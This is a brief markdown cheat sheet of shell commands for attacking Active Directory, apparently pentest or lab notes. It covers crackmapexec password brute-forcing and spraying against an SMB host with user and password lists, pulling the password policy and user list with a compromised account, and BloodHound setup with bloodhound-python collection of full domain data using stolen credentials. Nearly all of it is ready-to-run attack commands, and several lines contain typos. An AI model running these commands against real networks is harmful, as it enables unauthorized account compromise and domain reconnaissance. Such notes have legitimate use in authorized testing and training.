# Password Bruteforcing on Active Directory

```shell
# Get-Possible users 
Net user /domain

# Get users.txt and passwords.txt
# Scan host ip for ports with nmap
crackmapexec smb 192.168.29.155 
crackmapexec smb 192.168.29.155 -u users.txt -p passwords.txt
crackmapexec smb 192.168.29.155 -u users.txt -p passwords.txt --continue-on-success
crackmapexec smb 192.168.29.155 -u tgrant -p abc123 --pass-pol
crackmapexec smb 192.168.29.155 -u tgrant -p abc123 --users
```


# Domain Enumeration - BloodHound
```shell

# Install & run neo4j and bloodhound
cd/usr/bin
./neo4jconsole
    
./BloodHound--no-sandbox

# install Bloodhound-python from fox-it
pip install bloodhound
Bloodhound-python

# Add name server of domain so we can use fqdn in kali linux

bloodhound-python -u ckerr -p snickers -d xyz.com
bloodhound-python -u ckerr -p snickers -d xyz.com -c all

# Import collected data on bloodhound
```